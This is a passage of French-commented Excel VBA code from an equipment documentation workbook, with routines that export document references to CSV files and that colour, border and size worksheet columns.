    Print #FileCtrl, MsgConsult & " : " & Plan
    
    Close #FileCtrl
'    On Error GoTo 0
    On Error Resume Next
    Exit Sub
    
Fin:
    On Error GoTo 0
    'gestion de l'erreur d'|fffd|criture
    Purge_Data shCSV
    MsgCls.ShowMessage "MsgWrite", Chemin & Filename, "MsgEchec", vbNullString, vbOKOnly + vbCritical
    End
End Sub


'Version avec chargement d'autant de Plans que d'articles dans la GED, Chaque article pointe sur un plan
'Sub Gestion_Plan_Symetrique(Ligne_Csv As Long, Num_Document_Ged As String, Suffixe_Ged As String, Libelle_Ged As String, Sacim_Ged As String, NomFour_Ged As String, _
'                            Chemin_Ged As String, Fichiers_Ged As String, Indice_Ged As String, Format_Ged As String)
'    Dim Rech         As Object
'    Dim FirstAddress As String
'    Dim RefFour_Mat  As String
'    Dim Suffixe_Mat  As String
'    Dim Libelle_Mat  As String
'    Dim Ligne_Ref    As Long
'
'    Ecriture_CSV Ligne_Csv, Num_Document_Ged, Suffixe_Ged, Libelle_Ged, Sacim_Ged, NomFour_Ged, Chemin_Ged, Fichiers_Ged, Indice_Ged, Format_Ged
'
'    'Recherche dans l'onglet Mat|fffd|riel
'    With ThisWorkbook.Worksheets(shMateriels)
'        'on Doit trouver la R|fffd|f|fffd|rence du Document dans la colonne R|fffd|f|fffd|rence du Mat|fffd|riel
'        Set Rech = .Columns(.Range("MatRefFournisseur").Column).Find(what:=Num_Document_Ged, LookAt:=xlWhole)
'        If Rech Is Nothing Then
'            Set Rech = .Columns(.Range("MatDocument").Column).Find(what:=Num_Document_Ged, LookAt:=xlWhole)
'            If Not Rech Is Nothing Then
'                Ligne_Ref = Rech.Row 'pour |fffd|viter de prendre en compte un Document avec un nom diff|fffd|rent de la Ref Fournisseur sans que ce soit un multiple
'            End If
'        End If
'
'        Set Rech = .Columns(.Range("MatDocument").Column).Find(what:=Num_Document_Ged, LookAt:=xlWhole)
'        If Not Rech Is Nothing Then
'            'on Doit trouver la R|fffd|f|fffd|rence du Document sur une autre Ligne que la R|fffd|f|fffd|rence du Mat|fffd|riel
'            FirstAddress = Rech.Address
'
'            Do 'Article et R|fffd|f|fffd|rence / Suffixe Diff|fffd|rent
'                If Rech.Row <> Ligne_Ref Then
'                    RefFour_Mat = .Cells(Rech.Row, .Range("MatRefFournisseur").Column).Value
'                    Suffixe_Mat = .Cells(Rech.Row, .Range("MatSuffixeReference").Column).Value
'                    If Suffixe_Mat = "----" Then Suffixe_Mat = vbnullstring
'                    Libelle_Mat = .Cells(Rech.Row, .Range("MatDesignation").Column).Value
'
'                    If RefFour_Mat & "_" & Suffixe_Mat <> Num_Document_Ged & "_" & Suffixe_Ged Then
'                        'Pas d|fffd|j|fffd| |fffd|crit plus haut
'                        If .Cells(Rech.Row, .Range("MatNiveau").Column).Value = "S" Then
'                            'Plan Associ|fffd| |fffd| un Sous-Ensemble et pas d'article portant le N|fffd| du Sous-Ensemble
'                            If .Cells(Rech.Row + 1, .Range("MatRefFournisseur").Column).Value & "_" & _
'                              .Cells(Rech.Row + 1, .Range("MatSuffixeReference").Column).Value <> RefFour_Mat & "_" & Suffixe_Mat Then
'                                Ecriture_CSV Ligne_Csv, RefFour_Mat, Suffixe_Mat, Libelle_Mat, Sacim_Ged, NomFour_Ged, Chemin_Ged, Fichiers_Ged, Indice_Ged, Format_Ged
'                            End If
'                        Else 'Plan Associ|fffd| |fffd| un Article
'                            Ecriture_CSV Ligne_Csv, RefFour_Mat, Suffixe_Mat, Libelle_Mat, Sacim_Ged, NomFour_Ged, Chemin_Ged, Fichiers_Ged, Indice_Ged, Format_Ged
'                        End If
'                    End If
'                End If
'
'                Set Rech = .Columns(.Range("MatDocument").Column).FindNext(Rech)
'            Loop While Not Rech Is Nothing And Rech.Address <> FirstAddress
'        End If
'    End With
'End Sub


Sub Ecriture_CSV(ByRef Ligne_Csv As Long, Num_Document As String, Suf_Doc As String, Lib_Doc As String, Sacim As String, NomFour As String, _
                 Observation As String, Chemin As String, Fichiers As String, Indice As String, Format As String)
    Ligne_Csv = Ligne_Csv + 1
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 1).Value = Num_Document '(1)
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 2).Value = Suf_Doc '(2)
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 3).Value = ThisWorkbook.Sheets(shCde_Document).Cells(26, 3).Value '(3) Centre de Frais
    '(4) Code de criticit|fffd|
    '(5) Programme de r|fffd|f|fffd|rence
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 4).Value = Lib_Doc '(6)
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 5).Value = Sacim '(7) Code MABEC
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 6).Value = NomFour '(8) Nom du Fournisseur
    '(9) Rep|fffd|re du composant
    '(10) N|fffd| de matricule (Equipement)
    '(11) Libell|fffd| du N|fffd| de matricule
    '(12) Rep|fffd|re du moyen 12
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 7).Value = VBA.Str(VBA.Date) '(13) Date de modification
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 8).Value = ThisWorkbook.Sheets(shCde_Document).Cells(26, 8).Value '(14) Auteur de la modification
    '(15) Nature de la modification
    '(16) Commentaire sur la modification
    '(17) Identifiant du logiciel Applicatif associ|fffd|
    '(18) Identifiant du logiciel de Base associ|fffd|
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 9).Value = Observation '(19) Observations
    '(20) Code usine
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 10).Value = Chemin '(21) Chemin
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 11).Value = Fichiers '(22) Nom de fichier
    '(23) Num|fffd|ro de Pc Oscar
    '(24) Sch|fffd|ma
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 12).Value = Indice '(25)
    ThisWorkbook.Sheets(shCSV).Cells(Ligne_Csv, 13).Value = Format '(26)
End Sub


Sub Generation_Fichier_Csv()
    Dim FichierSortie As Variant
    Dim i As Integer
    
    If ThisWorkbook.Sheets(shCSV).Cells(2, 1).Value = vbNullString Then Exit Sub
    FichierSortie = Application.GetSaveAsFilename(vbNullString, fileFilter:="CSV Files (*.csv), *.csv")
    
    If FichierSortie = False Then Exit Sub
    'ThisWorkbook.Sheets(shCSV).Cells(1, 1).Value
    
    Open FichierSortie For Output As #1
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 1).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 2).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 3).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 4).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 5).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 6).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 7).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 8).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 9).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 10).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 11).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 12).Value); ";";
    Print #1, VBA.Trim(ThisWorkbook.Sheets(shCSV).Cells(1, 13).Value)
    i = 2
    While ThisWorkbook.Sheets(shCSV).Cells(i, 1).Value <> vbNullString
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 1).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 2).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 3).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 4).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 5).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 6).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 7).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 8).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 9).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 10).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 11).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 12).Value; ";";
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 13).Value
    i = i + 1
    Wend
    
    Close #1
    ThisWorkbook.Sheets(shCde_Document).Cells(31, 5).Value = VBA.Date & "-" & VBA.Time
End Sub


Sub Export_GEDTMI()
    Dim trouve          As Boolean
    Dim i               As Integer
    Dim Lig             As Long
    Dim ref_document    As String
    Dim FichierSortie As Variant

    'nettoyage des feuilles
    Worksheets(shCSV).Rows("2:65536").Delete
    'Extraction des doc Materiels
    Application.ScreenUpdating = False
    Init_var_dec ThisWorkbook.Worksheets(shMateriels)
    Lire_Dec 4, shMateriels
    'Num_ligne_Dec = Num_ligne_Dec
    Nb_Doc = 0
    
    ThisWorkbook.Worksheets(shCde_Document).Activate
    Application.ScreenUpdating = True
    
    For Lig = FirstLine(shMateriels) To Lastline(ThisWorkbook.Worksheets(shMateriels))
        'ThisWorkbook.Sheets(shMateriels).Cells(lig, P_CtrL_doc_dec).Value = vbnullstring
        Lire_Dec Lig, shMateriels
        ref_document = Document_Dec
        trouve = False
        Select Case ref_document
        Case vbNullString, "A0", "A1", "A2", "A3", "A4", "A?", "IN"
            ref_document = Cle_Ref_dec 'cette clef tien compte du suffixe
            ' recherche si d|fffd|ja en table
            For i = 1 To Nb_Doc
                If tab_document(i) = ref_document Then
                    trouve = True
                    i = Nb_Doc
                End If
            Next i
            If Not trouve Then
                Nb_Doc = Nb_Doc + 1
                tab_document(Nb_Doc) = ref_document
                ThisWorkbook.Sheets(shCSV).Cells(Nb_Doc + 1, 1).Value = ref_document
            End If
        Case "SP"
            'ThisWorkbook.Sheets(shMateriels).Cells(lig, P_CtrL_doc_dec).Value = vbnullstring
            ' on ne fait Rien pas de document
        Case Is > vbNullString
            ' recherche si d|fffd|ja en table
            For i = 1 To Nb_Doc
                If tab_document(Nb_Doc) = ref_document Then trouve = True
            Next i
            If Not trouve Then
                Nb_Doc = Nb_Doc + 1
                tab_document(Nb_Doc) = ref_document
                ThisWorkbook.Sheets(shCSV).Cells(Nb_Doc + 1, 1).Value = ref_document
            End If
        End Select
        ThisWorkbook.Sheets(shCde_Document).Cells(21, 8).Value = VBA.Str(Lig - 1)
    Next Lig
    
    'Extraction des doc documents
    Init_var_dec ThisWorkbook.Worksheets(shDocuments)
    Lire_Dec 4, shDocuments
    ThisWorkbook.Worksheets(shCde_Document).Activate
    For Lig = FirstLine(shDocuments) To Lastline(ThisWorkbook.Worksheets(shDocuments))
        Lire_Dec Lig, shDocuments
        ref_document = Cle_Ref_dec
        If Niveau_dec = "FD" Then
            trouve = False
            For i = 1 To Nb_Doc
                If tab_document(i) = ref_document Then
                    trouve = True
                    i = Nb_Doc
                End If
            Next i
            If Not trouve Then
                Nb_Doc = Nb_Doc + 1
                tab_document(Nb_Doc) = ref_document
                ThisWorkbook.Sheets(shCSV).Cells(Nb_Doc + 1, 1).Value = ref_document
            End If
        End If
        ThisWorkbook.Sheets(shCde_Document).Cells(22, 8).Value = VBA.Str(Lig - 1)
    Next Lig
    If ThisWorkbook.Sheets(shCSV).Cells(2, 1).Value = vbNullString Then Exit Sub
    
    FichierSortie = Application.GetSaveAsFilename(vbNullString, fileFilter:="CSV Files (*.csv), *.csv")
    If FichierSortie = False Then Exit Sub

    Open FichierSortie For Output As #1
    For i = 2 To Nb_Doc + 1
        'modif ACH v1.09 du 27/02/2008
        Print #1, ThisWorkbook.Sheets(shCSV).Cells(i, 1).Value; ";" & vbCrLf;
    Next i
    Close #1
    ThisWorkbook.Sheets(shCde_Document).Cells(31, 10).Value = VBA.Date & "-" & VBA.Time
End Sub

Sub GoToListeFID()
    ThisWorkbook.Sheets(shListeDeFID).Visible = True
    ThisWorkbook.Sheets(shListeDeFID).Select
End Sub
Attribute VB_Name = "H_Mise_En_Forme"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Mise En Forme du TDI
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 15/07/2008
'[Version       : V1.6 du 09/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Mise En Forme du TDI
'[---------------------------------------------------------------------------


'Bouton Mise En Forme du TDI
Sub Mise_en_Forme_TDI()
    frmProgression.FlagAbandon = 0
    frmProgression.lblN|fffd|Traitement = 4
    frmProgression.Show
End Sub


Function Mise_en_Forme()
    ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
    GererConfiguration False
    frmProgression.UpdateProgress 0, IniCls.ReadStringIniLangage("MsgFWK", "MsgEnCours"), 0
    Renumerotation_Numeros_Ordre vbNullString
    Mise_en_Forme_Onglets
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Mise_En_Forme").Value = "O" ' Valide l'option de colorisation
    If frmProgression.FlagAbandon = 0 Then frmProgression.UpdateProgress 1, IniCls.ReadStringIniLangage("MsgFWK", "MsgTermine"), 0
    Bouton_Affiche_Decoupage
    ' On r|fffd|active tout ce qui doit l'|fffd|tre
    GererConfiguration True
End Function


Sub Mise_en_Forme_Onglets()
    If frmProgression.FlagAbandon = 0 Then Format_Onglet shDecoupage
    If frmProgression.FlagAbandon = 0 Then Format_Onglet shMateriels
    If frmProgression.FlagAbandon = 0 Then Format_Onglet shDocuments
    If frmProgression.FlagAbandon = 0 Then Format_Onglet_Liste_PR: Largeur_Colonnes_ListePR shPieces_Rechange
End Sub


Sub Format_Onglet(ByVal Onglet_Source As String)
    Dim Ligne_Source As Long
    Dim Derniere_Ligne_Source As Long
    Dim Colonne As Integer
    Dim Derniere_Colonne_Source As Integer
    Dim Col_Niveau  As Integer
    Dim MsgInfo As String
    
    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgMiseEnForme")
    frmProgression.UpdateProgress 0 / 1, MsgInfo & " " & Onglet_Source, frmProgression.FlagAbandon

    ' Initialisation des colonnes
    'Init_Tab_Colonne_0 Onglet_Source, 1
    ' Recherche des derni|fffd|res ligne et colonne utilis|fffd|es de l'onglet Onglet_Source
    ThisWorkbook.Sheets(Onglet_Source).Activate
    
    Derniere_Ligne_Source = Lastline(ThisWorkbook.Worksheets(Onglet_Source))
    Derniere_Colonne_Source = Derniere_Colonne(Onglet_Source, 1, 1)
    
    ' Suppression de toute mise en forme
    With Range("A1:" & Cells(1, Derniere_Colonne_Source).Address & ",A2:" & Cells(3, Derniere_Colonne_Source).Address & ",A4:" & Cells(Derniere_Ligne_Source, Derniere_Colonne_Source).Address) ' Cells
        .Borders(xlDiagonalDown).LineStyle = xlNone
        .Borders(xlDiagonalUp).LineStyle = xlNone
        .Borders(xlEdgeLeft).LineStyle = xlNone
        .Borders(xlEdgeTop).LineStyle = xlNone
        .Borders(xlEdgeBottom).LineStyle = xlNone
        .Borders(xlEdgeRight).LineStyle = xlNone
        .Borders(xlInsideVertical).LineStyle = xlNone
        .Borders(xlInsideHorizontal).LineStyle = xlNone
        .Interior.ColorIndex = xlNone
        With .Font
            .Name = "Tahoma"
            .Size = 8
            .Strikethrough = False
            .Superscript = False
            .Subscript = False
            .OutlineFont = False
            .Shadow = False
            .Underline = xlUnderlineStyleNone
            .FontStyle = "Normal"
        End With
    End With
    ' Mise en forme de toutes les lignes
    With Range("A1:" & Cells(1, Derniere_Colonne_Source).Address & ",A2:" & Cells(3, Derniere_Colonne_Source).Address & ",A4:" & Cells(Derniere_Ligne_Source, Derniere_Colonne_Source).Address)
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = True
        .Orientation = 0
        .AddIndent = False
        .IndentLevel = 0
        .ShrinkToFit = False
        .ReadingOrder = xlContext
        .MergeCells = False
        .Borders(xlDiagonalDown).LineStyle = xlNone
        .Borders(xlDiagonalUp).LineStyle = xlNone
        With .Borders(xlEdgeLeft)
            .LineStyle = xlDouble
            .Weight = xlThick
            .ColorIndex = xlAutomatic
        End With
        With .Borders(xlEdgeTop)
            .LineStyle = xlDouble
            .Weight = xlThick
            .ColorIndex = xlAutomatic
        End With
        With .Borders(xlEdgeBottom)
            .LineStyle = xlDouble
            .Weight = xlThick
            .ColorIndex = xlAutomatic
        End With
        With .Borders(xlEdgeRight)
            .LineStyle = xlDouble
            .Weight = xlThick
            .ColorIndex = xlAutomatic
        End With
        With .Borders(xlInsideVertical)
            .LineStyle = xlContinuous
            .Weight = xlThin
            .ColorIndex = xlAutomatic
        End With
        With .Interior
            .ColorIndex = 0
            .Pattern = xlSolid
            .PatternColorIndex = xlAutomatic
        End With
    End With
    ' Mise en forme des lignes 1 |fffd| 3
    With Range("A1:" & Cells(1, Derniere_Colonne_Source).Address & ",A2:" & Cells(3, Derniere_Colonne_Source).Address)
        With .Font
            .FontStyle = "Bold"
        End With
        With .Interior
            .ColorIndex = 15
            .Pattern = xlSolid
            .PatternColorIndex = xlAutomatic
        End With
    End With
    ' Mise en forme de la ligne 2
    If Onglet_Source = shDecoupage Then
        Col_Niveau = ThisWorkbook.Sheets(Onglet_Source).Range("DecNiveau").Column
        Colonne = 1
        Do
            With Cells(2, Colonne).Interior
                If Cells(1, Colonne).Value = 2 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 0 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 3 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 4 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 5 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 6 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 7 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 8 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 9 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 15 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 16 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 18 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 19 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 20 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 21 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 22 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 23 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 24 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 27 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 32 Then
                    .ColorIndex = 34 ' bleu clair
                ElseIf Cells(1, Colonne).Value = 45 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 46 Then
                    .ColorIndex = 36 ' jaune
                End If
            End With
            Colonne = Colonne + 1
        Loop Until Colonne > Derniere_Colonne_Source
    ElseIf Onglet_Source = shMateriels Then
        Col_Niveau = ThisWorkbook.Sheets(Onglet_Source).Range("MatNiveau").Column
        Colonne = 1
        Do
            With Cells(2, Colonne).Interior
                If Cells(1, Colonne).Value = 12 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 0 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 13 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 14 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 16 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 19 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 21 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 22 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 23 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 24 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 29 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 30 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 32 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 33 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 42 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 43 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 18 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 45 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 46 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 48 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 49 Then
                    .ColorIndex = 36 ' jaune
                End If
            End With
            Colonne = Colonne + 1
        Loop Until Colonne > Derniere_Colonne_Source
    ElseIf Onglet_Source = shDocuments Then
        Col_Niveau = ThisWorkbook.Sheets(Onglet_Source).Range("DocNiveau").Column
        Colonne = 1
        Do
            With Cells(2, Colonne).Interior
                If Cells(1, Colonne).Value = 13 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 0 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 14 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 16 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 18 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 19 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 21 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 22 Then
                    .ColorIndex = 33 ' bleu
                ElseIf Cells(1, Colonne).Value = 23 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 24 Then
                    .ColorIndex = 34
                ElseIf Cells(1, Colonne).Value = 45 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 46 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 48 Then
                    .ColorIndex = 36 ' jaune
                ElseIf Cells(1, Colonne).Value = 49 Then
                    .ColorIndex = 36 ' jaune
                End If
            End With
            Colonne = Colonne + 1
        Loop Until Colonne > Derniere_Colonne_Source
    End If
    ' Mise en forme des lignes 2 |fffd| 3
    With Range("A2:" & Cells(3, Derniere_Colonne_Source).Address)
'    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = 90
        .AddIndent = False
        .IndentLevel = 0
        .ShrinkToFit = False
        .ReadingOrder = xlContext
        .MergeCells = False
    End With
    
    Ligne_Source = 4
    ' D|fffd|but de la boucle de traitement : on balaie toutes les lignes
    Do
        If frmProgression.FlagAbandon <> 0 Then Exit Do
        frmProgression.UpdateProgress Ligne_Source / Derniere_Ligne_Source, MsgInfo & " " & Onglet_Source & vbCrLf & "Ligne : " & Ligne_Source & " / " & Derniere_Ligne_Source, frmProgression.FlagAbandon
        DoEvents
        ' On r|fffd|capitule les PT, GE et E
'        Range(Cells(Ligne_Source, 1), Cells(Ligne_Source, Derniere_Colonne_Source)).Select
'        With Selection.Interior
        With Range(Cells(Ligne_Source, 1), Cells(Ligne_Source, Derniere_Colonne_Source)).Interior
            If ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne_Source, Col_Niveau).Value = "PT" Then
                .ColorIndex = 50
            ElseIf ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne_Source, Col_Niveau).Value = "GE" Then
                .ColorIndex = 42 '50 '12
            ElseIf ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne_Source, Col_Niveau).Value = "E" Then
                If Onglet_Source = shDecoupage Then .ColorIndex = 35 Else .ColorIndex = 4                                         '35 '19 '4 '43 modif suite |fffd| remarque Flins
            ElseIf ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne_Source, Col_Niveau).Value = "S" Then
                .ColorIndex = 6 '19 '35 '4
            ElseIf ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne_Source, Col_Niveau).Value = "A" Then
                .ColorIndex = 0 '35
            ElseIf ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne_Source, Col_Niveau).Value = "FR" Then
                .ColorIndex = 37 '26
            ElseIf ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne_Source, Col_Niveau).Value = "FD" Then
                .ColorIndex = 34 '38
            End If
        End With
        Ligne_Source = Ligne_Source + 1
    Loop Until Ligne_Source > Derniere_Ligne_Source

    If Onglet_Source = shDecoupage Then Largeur_Colonnes_Decoupage Onglet_Source Else Largeur_Colonnes_Mat_doc Onglet_Source

    ThisWorkbook.Sheets(Onglet_Source).Select
    ThisWorkbook.Sheets(Onglet_Source).Activate
    Cells(1, 1).Select
End Sub


Sub Format_Onglet_Liste_PR()
    Dim Ligne_Debut As Long, Ligne_Fin   As Long
    Dim MsgInfo     As String
    
    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgMiseEnForme")
    frmProgression.UpdateProgress 1 / 2, MsgInfo & " " & shPieces_Rechange, frmProgression.FlagAbandon
    With ThisWorkbook.Worksheets(shPieces_Rechange)
        Ligne_Debut = FirstLine(shPieces_Rechange)
        Ligne_Fin = Lastline(ThisWorkbook.Worksheets(shPieces_Rechange))

        With .Range(.Cells(Ligne_Debut, 1), .Cells(Ligne_Fin, 128))
            .Borders(xlEdgeTop).LineStyle = xlNone
            .Borders(xlInsideHorizontal).LineStyle = xlNone
            .Borders(xlEdgeBottom).LineStyle = xlNone
            With .Borders(xlEdgeLeft)
                .LineStyle = xlContinuous
                .Weight = xlThin
                .ColorIndex = xlAutomatic
            End With
            With .Borders(xlEdgeRight)
                .LineStyle = xlContinuous
                .Weight = xlThin
                .ColorIndex = xlAutomatic
            End With
            With .Borders(xlInsideVertical)
                .LineStyle = xlContinuous
                .Weight = xlThin
                .ColorIndex = xlAutomatic
            End With

            .HorizontalAlignment = xlLeft
            .VerticalAlignment = xlCenter
            .WrapText = True
            .Orientation = 0
            .AddIndent = False
            .IndentLevel = 0
            .ShrinkToFit = False
            .ReadingOrder = xlContext
            .MergeCells = False

            'Ne pas effacer la Mise en Forme r|fffd|alis|fffd|e par le Fournisseur ACH le 09/02/2009
            '.Interior.ColorIndex = xlNone
            '.Font.ColorIndex = 0
            With .Font
                .Name = "Arial"
                .Size = 8
                .Bold = False
                .ColorIndex = xlAutomatic
                .Strikethrough = False
                .Superscript = False
                .Subscript = False
                .OutlineFont = False
                .Shadow = False
                .Underline = xlUnderlineStyleNone
                .Italic = False
            End With
            With .Interior
                .ColorIndex = 0
            End With
        End With
        
        .Cells.EntireColumn.AutoFit
        .Cells.EntireRow.AutoFit
        .Columns("M").ColumnWidth = 6
        .Columns("P").ColumnWidth = 6
        .Columns("B").ColumnWidth = 5
        .Range("AE4").Interior.Pattern = xlGray25
        .Range("BN4").Interior.Pattern = xlGray25
        .Range("BD4").Interior.Pattern = xlGray25
    End With
    Affichage_Pieces_Rechange
End Sub

Sub Largeur_Colonnes_Decoupage(sh As String)
    Dim iColonne As Integer
    With ThisWorkbook.Worksheets(sh)
        ' On balaie toutes les colonnes
        iColonne = 1
        Do
            If Not (.Cells(1, iColonne).EntireColumn.Hidden) Then
                If .Cells(1, iColonne).Value = 0 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 1 Then
                    .Columns(iColonne).ColumnWidth = 6
                ElseIf .Cells(1, iColonne).Value = 2 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 3 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 4 Then
                    .Columns(iColonne).ColumnWidth = 4
                ElseIf .Cells(1, iColonne).Value = 5 Then
                    .Columns(iColonne).ColumnWidth = 4
                ElseIf .Cells(1, iColonne).Value = 6 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 7 Then
                    .Columns(iColonne).ColumnWidth = 4
                ElseIf .Cells(1, iColonne).Value = 8 Then
                    .Columns(iColonne).ColumnWidth = 4
                ElseIf .Cells(1, iColonne).Value = 9 Then
                    .Columns(iColonne).ColumnWidth = 40
                ElseIf .Cells(1, iColonne).Value = 10 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 11 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 12 Then
                    .Columns(iColonne).ColumnWidth = 8
                ElseIf .Cells(1, iColonne).Value = 13 Then
